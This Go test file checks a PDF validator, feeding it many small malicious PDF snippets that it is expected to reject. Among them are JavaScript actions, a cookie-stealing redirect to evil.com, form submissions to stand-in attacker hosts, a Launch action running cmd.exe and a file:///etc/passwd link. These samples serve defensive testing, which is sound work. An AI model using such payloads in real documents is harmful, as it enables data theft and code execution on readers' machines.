package pdfchecker

import (
	"testing"
)

func TestPDFValidator_Check(t *testing.T) {
	tests := []struct {
		name        string
		pdfContent  string
		expectError bool
		errorType   error
		description string
	}{
		{
			name:        "Valid PDF without dangerous content",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<</Size 4/Root 1 0 R>>\nstartxref\n174\n%%EOF",
			expectError: false,
			description: "Clean PDF should pass validation",
		},
		{
			name:        "PDF with JavaScript - /JavaScript",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/JavaScript 3 0 R>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with /JavaScript should be rejected",
		},
		{
			name:        "PDF with JavaScript - /JS",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/JS (app.alert('XSS'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with /JS should be rejected",
		},
		{
			name:        "PDF with JavaScript - /JavaScript Open System Calculator",
			pdfContent:  `%PDF-1.71 0 obj<</Pages 1 0 R /OpenAction 2 0 R>>2 0 obj<</S /JavaScript /JS (this.getURL("file:///System/Applications/Calculator.app"))>> trailer <</Root 1 0 R>>`,
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with /JS should be rejected",
		},
		{
			name:        "PDF with OpenAction",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with OpenAction should be rejected",
		},
		{
			name:        "PDF with app.alert JavaScript",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(app.alert('Malicious XSS'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with app.alert should be rejected",
		},
		{
			name:        "PDF with eval JavaScript",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(eval('malicious code'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with eval should be rejected",
		},
		{
			name:        "PDF with document. JavaScript",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(document.write('XSS'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with document. should be rejected",
		},
		{
			name:        "PDF with this. JavaScript",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(this.print())>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with this. should be rejected",
		},
		{
			name:        "PDF with getField",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(this.getField('field').value='evil')>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with getField should be rejected",
		},
		{
			name:        "PDF with submitForm",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(this.submitForm('http://evil.com'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with submitForm should be rejected",
		},
		{
			name:        "PDF with importDataObject",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</S/JavaScript/JS(this.importDataObject('evil'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "PDF with importDataObject should be rejected",
		},
		{
			name:        "PDF with AcroForm",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/AcroForm<</Fields[]>>>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with AcroForm should be rejected",
		},
		{
			name:        "PDF with XFA forms",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/AcroForm<</XFA[]>>>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with XFA should be rejected",
		},
		{
			name:        "PDF with Widget annotation",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/Widget>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with Widget should be rejected",
		},
		{
			name:        "PDF with text field",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/Widget/FT/Tx>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with text field should be rejected",
		},
		{
			name:        "PDF with choice field",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/Widget/FT/Ch>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with choice field should be rejected",
		},
		{
			name:        "PDF with button field",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/Widget/FT/Btn>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with button field should be rejected",
		},
		{
			name:        "PDF with signature field",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/Widget/FT/Sig>>\nendobj\n",
			expectError: true,
			errorType:   ErrFormDetected,
			description: "PDF with signature field should be rejected",
		},
		{
			name:        "PDF with URI action",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/URI/URI(http://malicious.com)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with URI should be rejected",
		},
		{
			name:        "PDF with GoToR action",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/GoToR/F(external.pdf)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with GoToR should be rejected",
		},
		{
			name:        "PDF with Launch action",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/Launch/F(malware.exe)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with Launch should be rejected",
		},
		{
			name:        "PDF with ImportData action",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/ImportData/F(data.fdf)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with ImportData should be rejected",
		},
		{
			name:        "PDF with SubmitForm action",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/SubmitForm/F(http://evil.com/collect)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with SubmitForm should be rejected",
		},
		{
			name:        "PDF with HTTP URL",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/URI/URI(http://malicious.com/xss.js)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with HTTP URL should be rejected",
		},
		{
			name:        "PDF with HTTPS URL",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/URI/URI(https://evil.com/payload)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with HTTPS URL should be rejected",
		},
		{
			name:        "PDF with FTP URL",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/URI/URI(ftp://malicious.com/data)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with FTP URL should be rejected",
		},
		{
			name:        "PDF with file:// URL",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Action/S/URI/URI(file:///etc/passwd)>>\nendobj\n",
			expectError: true,
			errorType:   ErrExternalRefDetected,
			description: "PDF with file:// URL should be rejected",
		},
		{
			name:        "PDF with embedded file",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Filespec/F(embedded.exe)/EF<</F 2 0 R>>>>\nendobj\n2 0 obj\n<</Type/EmbeddedFile/Length 100>>\nstream\nmalicious binary data\nendstream\nendobj\n",
			expectError: true,
			description: "PDF with embedded file should be rejected",
		},
		{
			name:        "PDF with file attachment",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Annot/Subtype/FileAttachment/FS 2 0 R>>\nendobj\n",
			expectError: true,
			description: "PDF with file attachment should be rejected",
		},
		{
			name:        "Empty PDF content",
			pdfContent:  "",
			expectError: true,
			errorType:   ErrInvalidPDFStructure,
			description: "Empty content should be rejected",
		},
		{
			name:        "Invalid PDF header",
			pdfContent:  "Not a PDF file",
			expectError: true,
			errorType:   ErrInvalidPDFStructure,
			description: "Invalid header should be rejected",
		},
		{
			name:        "Case-insensitive JavaScript detection",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</s/javascript/js(app.Alert('XSS'))>>\nendobj\n",
			expectError: true,
			errorType:   ErrJavaScriptDetected,
			description: "Case-insensitive JavaScript should be detected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := Check([]byte(tt.pdfContent))

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for test '%s', but got none. Description: %s", tt.name, tt.description)
					return
				}

				// Check specific error type if provided
				if tt.errorType != nil && err != tt.errorType {
					t.Logf("Expected error type %v, got %v for test '%s'", tt.errorType, err, tt.name)
					// Don't fail here as different error types might still indicate proper detection
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for test '%s', but got: %v. Description: %s", tt.name, err, tt.description)
				}
			}
		})
	}
}

func TestPDFValidator_OWASP_ComplianceScenarios(t *testing.T) {
	// OWASP Top 10 related PDF attack vectors
	owaspTests := []struct {
		name        string
		pdfContent  string
		attackType  string
		description string
	}{
		{
			name:        "A03 Injection - JavaScript Injection via PDF",
			pdfContent:  "%PDF-1.4\n<</S/JavaScript/JS(app.alert('Injected XSS via PDF'))>>",
			attackType:  "Injection",
			description: "JavaScript injection through PDF objects",
		},
		{
			name:        "A03 Injection - Form-based data exfiltration",
			pdfContent:  "%PDF-1.4\n<</Type/Action/S/SubmitForm/F(http://attacker.com/steal)/Fields[]>>",
			attackType:  "Injection",
			description: "Form submission to external attacker-controlled server",
		},
		{
			name:        "A05 Security Misconfiguration - Unsafe PDF features",
			pdfContent:  "%PDF-1.4\n<</Type/Action/S/Launch/F(cmd.exe)/P(/c calc.exe)>>",
			attackType:  "Security Misconfiguration",
			description: "Launch action attempting to execute system commands",
		},
		{
			name:        "A06 Vulnerable Components - PDF with embedded malware",
			pdfContent:  "%PDF-1.4\n<</Type/EmbeddedFile/F(malware.exe)/Filter/ASCIIHexDecode>>",
			attackType:  "Vulnerable Components",
			description: "PDF with embedded executable file",
		},
		{
			name:        "A10 Server-Side Request Forgery - External resource access",
			pdfContent:  "%PDF-1.4\n<</Type/Action/S/URI/URI(http://internal-server:8080/admin)>>",
			attackType:  "SSRF",
			description: "PDF attempting to access internal resources",
		},
		{
			name:        "Cross-Site Scripting via PDF - document object access",
			pdfContent:  "%PDF-1.4\n<</S/JavaScript/JS(document.location='http://evil.com?'+document.cookie)>>",
			attackType:  "XSS",
			description: "JavaScript attempting to steal cookies via document object",
		},
		{
			name:        "Phishing via PDF - External form submission",
			pdfContent:  "%PDF-1.4\n<</Type/Action/S/SubmitForm/F(https://fake-bank.com/login)/Method/POST>>",
			attackType:  "Phishing",
			description: "Form configured to submit sensitive data to phishing site",
		},
		{
			name:        "Data Exfiltration - File access attempt",
			pdfContent:  "%PDF-1.4\n<</S/JavaScript/JS(this.importDataObject('sensitive-data'))>>",
			attackType:  "Data Exfiltration",
			description: "JavaScript attempting to import external data objects",
		},
	}

	for _, tt := range owaspTests {
		t.Run(tt.name, func(t *testing.T) {
			err := Check([]byte(tt.pdfContent))

			if err == nil {
				t.Errorf("OWASP compliance test failed: '%s' should be blocked. Attack type: %s. Description: %s",
					tt.name, tt.attackType, tt.description)
			} else {
				t.Logf("OWASP test passed: '%s' correctly blocked with error: %v", tt.name, err)
			}
		})
	}
}

func TestPDFValidator_EdgeCases(t *testing.T) {
	edgeCases := []struct {
		name        string
		pdfContent  string
		shouldBlock bool
		description string
	}{
		{
			name:        "Obfuscated JavaScript with hex encoding",
			pdfContent:  "%PDF-1.4\n<</S/JavaScript/JS(#6170702E616C657274282758535327293B)>>\n",
			shouldBlock: true,
			description: "Hex-encoded JavaScript should still be detected",
		},
		{
			name:        "Multiple malicious features combined",
			pdfContent:  "%PDF-1.4\n<</S/JavaScript/JS(app.alert('XSS'))/OpenAction 2 0 R>>\n2 0 obj\n<</S/URI/URI(http://evil.com)>>",
			shouldBlock: true,
			description: "PDF with multiple attack vectors should be blocked",
		},
		{
			name:        "Whitespace variations in dangerous patterns",
			pdfContent:  "%PDF-1.4\n<< / S / JavaScript / JS ( app . alert ( 'XSS' ) ) >>",
			shouldBlock: true,
			description: "JavaScript with extra whitespace should be detected",
		},
		{
			name:        "Legitimate PDF with safe annotations",
			pdfContent:  "%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/Annots[4 0 R]>>\nendobj\n4 0 obj\n<</Type/Annot/Subtype/Text/Contents(Safe note)>>\nendobj",
			shouldBlock: false,
			description: "PDF with safe text annotations should be allowed",
		},
	}

	for _, tt := range edgeCases {
		t.Run(tt.name, func(t *testing.T) {
			err := Check([]byte(tt.pdfContent))

			if tt.shouldBlock && err == nil {
				t.Errorf("Edge case test failed: '%s' should be blocked. Description: %s", tt.name, tt.description)
			} else if !tt.shouldBlock && err != nil {
				t.Errorf("Edge case test failed: '%s' should be allowed but was blocked with error: %v. Description: %s",
					tt.name, err, tt.description)
			}
		})
	}
}
